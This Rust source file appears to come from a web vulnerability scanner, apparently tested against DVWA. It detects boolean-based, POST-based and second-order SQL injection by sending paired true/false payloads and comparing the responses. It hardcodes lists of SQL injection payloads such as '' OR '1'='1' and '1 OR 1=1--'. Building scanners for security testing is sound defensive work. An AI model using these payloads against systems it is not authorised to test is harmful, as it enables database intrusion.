//! Boolean-based SQL Injection Detection
//!
//! Detects SQLi by injecting TRUE and FALSE conditions and comparing responses.

use crate::http::client::HttpClient;
use crate::http::request::HttpRequest;
use crate::payload::loader::load_payloads;
use crate::sqli::inference::{body_similarity, contains_sql_error, detect_db_from_error};
use crate::sqli::{SqliResult, SqliTechnique};
use reqwest::Method;
use url::Url;

/// TRUE condition payloads (string context)
const TRUE_PAYLOADS: &[&str] = &[
    "' OR '1'='1",
    "' OR '1'='1'--",
    "\" OR \"1\"=\"1",
    "' OR 1=1--",
    "') OR ('1'='1",
    "1 OR 1=1",
];

/// FALSE condition payloads (string context)
const FALSE_PAYLOADS: &[&str] = &[
    "' AND '1'='2",
    "' AND '1'='2'--",
    "\" AND \"1\"=\"2",
    "' AND 1=2--",
    "') AND ('1'='2",
    "1 AND 1=2",
];

/// TRUE condition payloads (numeric context - for medium security)
const NUMERIC_TRUE_PAYLOADS: &[&str] = &[
    "1 OR 1=1",
    "1 OR 1=1--",
    "1 OR 1=1#",
    "1) OR (1=1",
    "1)) OR ((1=1",
];

/// FALSE condition payloads (numeric context)
const NUMERIC_FALSE_PAYLOADS: &[&str] = &[
    "1 AND 1=2",
    "1 AND 1=2--",
    "1 AND 1=2#",
    "1) AND (1=2",
    "1)) AND ((1=2",
];

/// Detect boolean-based SQL injection
pub async fn detect(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
) -> anyhow::Result<Option<SqliResult>> {
    // Step 1: Get baseline response
    let baseline_req = HttpRequest::new(Method::GET, base_url.clone());
    let baseline_resp = client.execute(baseline_req).await?;
    let baseline_body = baseline_resp.body_text();
    let baseline_len = baseline_resp.body_len;

    // Step 2: Try TRUE/FALSE payload pairs
    for (true_payload, false_payload) in TRUE_PAYLOADS.iter().zip(FALSE_PAYLOADS.iter()) {
        // Inject TRUE condition
        let mut true_url = base_url.clone();
        true_url.query_pairs_mut().append_pair(param, true_payload);
        let true_req = HttpRequest::new(Method::GET, true_url);
        let true_resp = client.execute(true_req).await?;
        let true_body = true_resp.body_text();

        // Inject FALSE condition
        let mut false_url = base_url.clone();
        false_url.query_pairs_mut().append_pair(param, false_payload);
        let false_req = HttpRequest::new(Method::GET, false_url);
        let false_resp = client.execute(false_req).await?;
        let false_body = false_resp.body_text();

        // Step 3: Analyze responses
        let mut confidence: f32 = 0.0;
        let mut db_type = None;
        let mut details = Vec::new();

        // Check for SQL errors
        if contains_sql_error(&true_body) || contains_sql_error(&false_body) {
            confidence += 0.4;
            db_type = detect_db_from_error(&true_body)
                .or_else(|| detect_db_from_error(&false_body));
            details.push("SQL error detected in response".to_string());
        }

        // Check status code differences
        if true_resp.status != false_resp.status {
            confidence += 0.3;
            details.push(format!(
                "Status code differs: TRUE={} FALSE={}",
                true_resp.status, false_resp.status
            ));
        }

        // Check body length differences between TRUE and FALSE responses
        let len_diff = (true_resp.body_len as i64 - false_resp.body_len as i64).abs();
        let len_diff_percent = if baseline_len > 0 {
            len_diff as f32 / baseline_len as f32
        } else {
            0.0
        };

        // More sensitive threshold: 5% difference is significant
        if len_diff_percent > 0.05 || len_diff > 100 {
            confidence += 0.3;
            details.push(format!(
                "Body length differs: TRUE={} FALSE={} ({}% diff, {} bytes)",
                true_resp.body_len,
                false_resp.body_len,
                (len_diff_percent * 100.0) as i32,
                len_diff
            ));
        }

        // Check body content similarity
        let true_false_sim = body_similarity(&true_body, &false_body);
        let true_baseline_sim = body_similarity(&true_body, &baseline_body);

        if true_false_sim < 0.8 && true_baseline_sim > 0.5 {
            confidence += 0.2;
            details.push(format!(
                "TRUE response similar to baseline, different from FALSE (sim: {:.2})",
                true_false_sim
            ));
        }

        // If confidence is high enough, report finding
        // Lower threshold to catch more potential SQLi
        if confidence >= 0.3 {
            return Ok(Some(SqliResult {
                endpoint: base_url.to_string(),
                parameter: param.to_string(),
                technique: if contains_sql_error(&true_body) || contains_sql_error(&false_body) {
                    SqliTechnique::ErrorBased
                } else {
                    SqliTechnique::Boolean
                },
                confidence: confidence.min(1.0),
                db_type,
                details: details.join("; "),
            }));
        }
    }

    Ok(None)
}

/// Extended boolean detection with more payloads from file
pub async fn detect_extended(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
) -> anyhow::Result<Vec<SqliResult>> {
    let mut results = Vec::new();

    // Load payloads from file
    let payloads = match load_payloads("payloads/sqli/boolean.txt") {
        Ok(set) => set.payloads,
        Err(_) => TRUE_PAYLOADS.iter().map(|s| s.to_string()).collect(),
    };

    // Get baseline
    let baseline_req = HttpRequest::new(Method::GET, base_url.clone());
    let baseline_resp = client.execute(baseline_req).await?;
    let baseline_body = baseline_resp.body_text();

    for payload in payloads.iter() {
        let mut url = base_url.clone();
        url.query_pairs_mut().append_pair(param, payload);

        let req = HttpRequest::new(Method::GET, url);
        let resp = client.execute(req).await?;
        let body = resp.body_text();

        // Check for SQL error
        if contains_sql_error(&body) {
            let db_type = detect_db_from_error(&body);
            results.push(SqliResult {
                endpoint: base_url.to_string(),
                parameter: param.to_string(),
                technique: SqliTechnique::ErrorBased,
                confidence: 0.9,
                db_type,
                details: format!("SQL error with payload: {}", payload),
            });
        }

        // Check for significant body change
        let sim = body_similarity(&body, &baseline_body);
        if sim < 0.5 && resp.status == 200 {
            results.push(SqliResult {
                endpoint: base_url.to_string(),
                parameter: param.to_string(),
                technique: SqliTechnique::Boolean,
                confidence: 0.6,
                db_type: None,
                details: format!("Response changed significantly (sim: {:.2}) with: {}", sim, payload),
            });
        }
    }

    Ok(results)
}

/// Detect boolean-based SQL injection via POST method
pub async fn detect_post(
    client: &HttpClient,
    base_url: &Url,
    param: &str,
    extra_data: Option<&str>,
) -> anyhow::Result<Option<SqliResult>> {
    // Step 1: Get baseline response with normal value
    let baseline_body_data = format!("{}=1{}", param, extra_data.map(|d| format!("&{}", d)).unwrap_or_default());
    let mut baseline_req = HttpRequest::new(Method::POST, base_url.clone());
    baseline_req.set_body(baseline_body_data);
    baseline_req.set_header("Content-Type", "application/x-www-form-urlencoded");
    let baseline_resp = client.execute(baseline_req).await?;
    let baseline_body = baseline_resp.body_text();
    let baseline_len = baseline_resp.body_len;

    // Try both string and numeric payloads
    let payload_pairs: Vec<(&str, &str)> = TRUE_PAYLOADS.iter()
        .zip(FALSE_PAYLOADS.iter())
        .map(|(t, f)| (*t, *f))
        .chain(
            NUMERIC_TRUE_PAYLOADS.iter()
                .zip(NUMERIC_FALSE_PAYLOADS.iter())
                .map(|(t, f)| (*t, *f))
        )
        .collect();

    for (true_payload, false_payload) in payload_pairs {
        // Inject TRUE condition
        let true_body_data = format!("{}={}{}", param, true_payload, extra_data.map(|d| format!("&{}", d)).unwrap_or_default());
        let mut true_req = HttpRequest::new(Method::POST, base_url.clone());
        true_req.set_body(true_body_data);
        true_req.set_header("Content-Type", "application/x-www-form-urlencoded");
        let true_resp = client.execute(true_req).await?;
        let true_body = true_resp.body_text();

        // Inject FALSE condition
        let false_body_data = format!("{}={}{}", param, false_payload, extra_data.map(|d| format!("&{}", d)).unwrap_or_default());
        let mut false_req = HttpRequest::new(Method::POST, base_url.clone());
        false_req.set_body(false_body_data);
        false_req.set_header("Content-Type", "application/x-www-form-urlencoded");
        let false_resp = client.execute(false_req).await?;
        let false_body = false_resp.body_text();

        // Step 3: Analyze responses
        let mut confidence: f32 = 0.0;
        let mut db_type = None;
        let mut details = Vec::new();

        // Check for SQL errors
        if contains_sql_error(&true_body) || contains_sql_error(&false_body) {
            confidence += 0.4;
            db_type = detect_db_from_error(&true_body)
                .or_else(|| detect_db_from_error(&false_body));
            details.push("SQL error detected in response".to_string());
        }

        // Check status code differences
        if true_resp.status != false_resp.status {
            confidence += 0.3;
            details.push(format!(
                "Status code differs: TRUE={} FALSE={}",
                true_resp.status, false_resp.status
            ));
        }

        // Check body length differences
        let len_diff = (true_resp.body_len as i64 - false_resp.body_len as i64).abs();
        let len_diff_percent = if baseline_len > 0 {
            len_diff as f32 / baseline_len as f32
        } else {
            0.0
        };

        if len_diff_percent > 0.05 || len_diff > 100 {
            confidence += 0.3;
            details.push(format!(
                "Body length differs: TRUE={} FALSE={} ({}% diff, {} bytes)",
                true_resp.body_len,
                false_resp.body_len,
                (len_diff_percent * 100.0) as i32,
                len_diff
            ));
        }

        // Check body content similarity
        let true_false_sim = body_similarity(&true_body, &false_body);
        let true_baseline_sim = body_similarity(&true_body, &baseline_body);

        if true_false_sim < 0.8 && true_baseline_sim > 0.5 {
            confidence += 0.2;
            details.push(format!(
                "TRUE response similar to baseline, different from FALSE (sim: {:.2})",
                true_false_sim
            ));
        }

        // If confidence is high enough, report finding
        if confidence >= 0.3 {
            return Ok(Some(SqliResult {
                endpoint: base_url.to_string(),
                parameter: param.to_string(),
                technique: if contains_sql_error(&true_body) || contains_sql_error(&false_body) {
                    SqliTechnique::ErrorBased
                } else {
                    SqliTechnique::Boolean
                },
                confidence: confidence.min(1.0),
                db_type,
                details: details.join("; "),
            }));
        }
    }

    Ok(None)
}

/// Detect second-order SQL injection (inject on one endpoint, observe on another)
/// This is used for HIGH security scenarios like DVWA where input is stored in session
pub async fn detect_second_order(
    client: &HttpClient,
    inject_url: &Url,
    trigger_url: &Url,
    param: &str,
    extra_data: Option<&str>,
) -> anyhow::Result<Option<SqliResult>> {
    tracing::info!(
        "[Second-Order] Inject URL: {}, Trigger URL: {}",
        inject_url,
        trigger_url
    );

    // Step 1: Get baseline by injecting normal value and checking trigger URL
    let baseline_inject_data = format!(
        "{}=1{}",
        param,
        extra_data.map(|d| format!("&{}", d)).unwrap_or_default()
    );
    let mut baseline_inject_req = HttpRequest::new(Method::POST, inject_url.clone());
    baseline_inject_req.set_body(baseline_inject_data);
    baseline_inject_req.set_header("Content-Type", "application/x-www-form-urlencoded");
    client.execute(baseline_inject_req).await?;

    // Check trigger URL for baseline response
    let baseline_trigger_req = HttpRequest::new(Method::GET, trigger_url.clone());
    let baseline_trigger_resp = client.execute(baseline_trigger_req).await?;
    let baseline_body = baseline_trigger_resp.body_text();
    let baseline_len = baseline_trigger_resp.body_len;

    // Combine string and numeric payload pairs
    let payload_pairs: Vec<(&str, &str)> = TRUE_PAYLOADS
        .iter()
        .zip(FALSE_PAYLOADS.iter())
        .map(|(t, f)| (*t, *f))
        .chain(
            NUMERIC_TRUE_PAYLOADS
                .iter()
                .zip(NUMERIC_FALSE_PAYLOADS.iter())
                .map(|(t, f)| (*t, *f)),
        )
        .collect();

    for (true_payload, false_payload) in payload_pairs {
        // Step 2: Inject TRUE payload
        let true_inject_data = format!(
            "{}={}{}",
            param,
            true_payload,
            extra_data.map(|d| format!("&{}", d)).unwrap_or_default()
        );
        let mut true_inject_req = HttpRequest::new(Method::POST, inject_url.clone());
        true_inject_req.set_body(true_inject_data);
        true_inject_req.set_header("Content-Type", "application/x-www-form-urlencoded");
        client.execute(true_inject_req).await?;

        // Check trigger URL for TRUE response
        let true_trigger_req = HttpRequest::new(Method::GET, trigger_url.clone());
        let true_trigger_resp = client.execute(true_trigger_req).await?;
        let true_body = true_trigger_resp.body_text();

        // Step 3: Inject FALSE payload
        let false_inject_data = format!(
            "{}={}{}",
            param,
            false_payload,
            extra_data.map(|d| format!("&{}", d)).unwrap_or_default()
        );
        let mut false_inject_req = HttpRequest::new(Method::POST, inject_url.clone());
        false_inject_req.set_body(false_inject_data);
        false_inject_req.set_header("Content-Type", "application/x-www-form-urlencoded");
        client.execute(false_inject_req).await?;

        // Check trigger URL for FALSE response
        let false_trigger_req = HttpRequest::new(Method::GET, trigger_url.clone());
        let false_trigger_resp = client.execute(false_trigger_req).await?;
        let false_body = false_trigger_resp.body_text();

        // Step 4: Analyze responses from trigger URL
        let mut confidence: f32 = 0.0;
        let mut db_type = None;
        let mut details = Vec::new();

        // Check for SQL errors on trigger page
        if contains_sql_error(&true_body) || contains_sql_error(&false_body) {
            confidence += 0.4;
            db_type = detect_db_from_error(&true_body).or_else(|| detect_db_from_error(&false_body));
            details.push("SQL error detected on trigger page".to_string());
        }

        // Check status code differences
        if true_trigger_resp.status != false_trigger_resp.status {
            confidence += 0.3;
            details.push(format!(
                "Status code differs: TRUE={} FALSE={}",
                true_trigger_resp.status, false_trigger_resp.status
            ));
        }

        // Check body length differences
        let len_diff = (true_trigger_resp.body_len as i64 - false_trigger_resp.body_len as i64).abs();
        let len_diff_percent = if baseline_len > 0 {
            len_diff as f32 / baseline_len as f32
        } else {
            0.0
        };

        if len_diff_percent > 0.02 || len_diff > 50 {
            confidence += 0.3;
            details.push(format!(
                "Trigger response length differs: TRUE={} FALSE={} ({}% diff, {} bytes)",
                true_trigger_resp.body_len,
                false_trigger_resp.body_len,
                (len_diff_percent * 100.0) as i32,
                len_diff
            ));
        }

        // Check body content similarity
        let true_false_sim = body_similarity(&true_body, &false_body);
        let true_baseline_sim = body_similarity(&true_body, &baseline_body);

        if true_false_sim < 0.9 && true_baseline_sim > 0.5 {
            confidence += 0.2;
            details.push(format!(
                "TRUE response differs from FALSE on trigger page (sim: {:.2})",
                true_false_sim
            ));
        }

        // If confidence is high enough, report finding
        if confidence >= 0.3 {
            return Ok(Some(SqliResult {
                endpoint: inject_url.to_string(),
                parameter: param.to_string(),
                technique: SqliTechnique::SecondOrder,
                confidence: confidence.min(1.0),
                db_type,
                details: format!(
                    "Second-order SQLi: inject={} trigger={}; {}",
                    inject_url,
                    trigger_url,
                    details.join("; ")
                ),
            }));
        }
    }

    Ok(None)
}

